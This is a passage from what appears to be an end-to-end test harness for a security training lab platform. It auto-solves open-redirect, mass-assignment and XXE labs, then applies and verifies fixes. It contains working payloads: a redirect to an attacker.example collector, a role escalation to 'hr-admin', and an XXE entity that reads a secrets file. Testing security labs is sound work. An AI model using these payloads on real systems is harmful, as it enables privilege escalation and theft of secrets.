    record('open-redirect-oauth', 'flag objective accepted', submitted.status === 200 && submitted.json.passed === true, submitted.json?.message ?? `status=${submitted.status}`);
    const applied = await terminalExec(session.id, client.cookieHeader(), `printf '%s' '{"validateRedirect":true}' | labctl policy apply -`, '');
    record('open-redirect-oauth', 'redirect validation applied', applied.includes('"applied": true'), applied.slice(-110).replace(/\s+/g, ' '));
    const replayed = await gateway(client, session.id, 'web', `/oauth/authorize?client_id=kestrel-web&redirect_uri=${encodeURIComponent('https://attacker.example/collect')}`);
    record('open-redirect-oauth', 'unregistered host now rejected', replayed.status === 400, `status=${replayed.status}`);
    const checked = await runCheck(client, session.id, 'redirect-check');
    record('open-redirect-oauth', 'live redirect validator passes', checked.status === 200 && checked.json.passed === true, checkDetail(checked));
    return { flagObjective: 'oauth-flag', checkObjective: 'redirect-check' };
  },

  async 'mass-assignment-profile'(client, session, { gateway, terminalExec }) {
    const baseline = await gateway(client, session.id, 'web', '/api/payroll/ledger');
    record('mass-assignment-profile', 'payroll ledger forbidden for an employee', baseline.status === 403, `status=${baseline.status}`);
    const escalated = await gateway(client, session.id, 'web', '/api/profile', {
      method: 'PATCH',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ role: 'hr-admin' }),
    });
    record('mass-assignment-profile', 'role field accepted by the update', escalated.status === 200 && /hr-admin/.test(escalated.text), `status=${escalated.status}`);
    const ledger = await gateway(client, session.id, 'web', '/api/payroll/ledger');
    const flag = ledger.text.match(/CF\{[^}]+\}/)?.[0];
    record('mass-assignment-profile', 'payroll ledger readable after escalation', ledger.status === 200 && /^CF\{/.test(flag ?? ''), `status=${ledger.status}`);
    const submitted = await submitFlag(client, session.id, 'profile-flag', flag);
    record('mass-assignment-profile', 'flag objective accepted', submitted.status === 200 && submitted.json.passed === true, submitted.json?.message ?? `status=${submitted.status}`);
    const applied = await terminalExec(session.id, client.cookieHeader(), `printf '%s' '{"fieldWhitelist":true}' | labctl policy apply -`, '');
    record('mass-assignment-profile', 'field allow-list applied', applied.includes('"applied": true'), applied.slice(-110).replace(/\s+/g, ' '));
    const replayed = await gateway(client, session.id, 'web', '/api/profile', {
      method: 'PATCH',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ role: 'employee' }),
    });
    record('mass-assignment-profile', 'role field ignored after the fix', replayed.status === 200 && !/hr-admin/.test(replayed.text), `status=${replayed.status}`);
    const checked = await runCheck(client, session.id, 'whitelist');
    record('mass-assignment-profile', 'live allow-list validator passes', checked.status === 200 && checked.json.passed === true, checkDetail(checked));
    return { flagObjective: 'profile-flag', checkObjective: 'whitelist' };
  },

  async 'xxe-document-parser'(client, session, { gateway, terminalExec }) {
    const payload =
      '<?xml version="1.0"?><!DOCTYPE invoice [<!ENTITY secret SYSTEM "file:///srv/arclight/secrets/billing.env">]><invoice><line>&secret;</line></invoice>';
    const parsed = await gateway(client, session.id, 'web', '/api/documents/parse', {
      method: 'POST',
      headers: { 'content-type': 'application/xml' },
      body: payload,
    });
    const flag = parsed.text.match(/CF\{[^}]+\}/)?.[0];
    record('xxe-document-parser', 'entity expansion returns the billing secret', parsed.status === 200 && /^CF\{/.test(flag ?? ''), `status=${parsed.status}`);
    const submitted = await submitFlag(client, session.id, 'xxe-flag', flag);
    record('xxe-document-parser', 'flag objective accepted', submitted.status === 200 && submitted.json.passed === true, submitted.json?.message ?? `status=${submitted.status}`);
    const applied = await terminalExec(session.id, client.cookieHeader(), `printf '%s' '{"allowDoctype":false}' | labctl policy apply -`, '');
    record('xxe-document-parser', 'DTD hardening applied', applied.includes('"applied": true'), applied.slice(-110).replace(/\s+/g, ' '));
    const replayed = await gateway(client, session.id, 'web', '/api/documents/parse', {
      method: 'POST',
      headers: { 'content-type': 'application/xml' },
      body: payload,
    });
    record('xxe-document-parser', 'DTD payload now rejected', replayed.status === 400 && !/CF\{/.test(replayed.text), `status=${replayed.status}`);
    const checked = await runCheck(client, session.id, 'disable-dtd');
    record('xxe-document-parser', 'live parser validator passes', checked.status === 200 && checked.json.passed === true, checkDetail(checked));
    return { flagObjective: 'xxe-flag', checkObjective: 'disable-dtd' };
  },
};

async function main() {
  const requested = process.argv.slice(2);
  const probe = new Client();
  await probe.login();
  const labs = await probe.api('GET', '/api/labs');
  const available = (labs.json?.labs ?? []).filter((l) => l.runnable).map((l) => l.id);
  const targets = requested.length ? requested : available;

  // Provisioning is rate limited per learner (12/hour by default), so the
  // harness rotates to a fresh account every few labs instead of pretending
  // the quota does not exist.
  const CHUNK = 8;
  for (let offset = 0; offset < targets.length; offset += CHUNK) {
    const chunk = targets.slice(offset, offset + CHUNK);
    const client = offset === 0 ? probe : new Client();
    if (offset > 0) await client.login();
    for (const labId of chunk) {
      if (!available.includes(labId)) {
        record(labId, 'lab is runnable', false, 'not published/runnable');
        continue;
      }
      try {
        const { session } = await startLab(client, labId);
        record(labId, 'session reached ready', session.state === 'ready', `state=${session.state} ${session.failure?.code ?? ''}`);
        if (session.state !== 'ready') continue;
        await muteEcho(session.id, client.cookieHeader());
        const solver = solvers[labId];
        if (!solver) {
          record(labId, 'solver implemented', false, 'no automated exploit path for this lab yet');
          continue;
        }
        const outcome = await solver(client, session, { gateway, terminalExec });
        const summary = await client.api('GET', '/api/me/summary');
        const progress = (await client.api('GET', `/api/labs/${labId}`)).json?.lab?.progress;
        record(labId, 'lab marked complete', progress?.status === 'completed', `objectives=${progress?.objectivesCompleted} xp=${summary.json?.xp}`);
        const stop = await client.api('POST', `/api/sessions/${session.id}/stop`, {});
        record(labId, 'session stopped cleanly', stop.json?.session?.state === 'stopped', `state=${stop.json?.session?.state}`);
        void outcome;
      } catch (err) {
        record(labId, 'solver crashed', false, err.message);
      }
    }
  }
  const pass = results.filter((r) => r.ok).length;
  const fail = results.length - pass;
  console.log(`SUMMARY labs=${targets.length} checks=${results.length} pass=${pass} fail=${fail}`);
  if (fail > 0) process.exitCode = 1;
}

main().catch((err) => {
  console.error('lab-e2e failed:', err);
  process.exit(1);
});
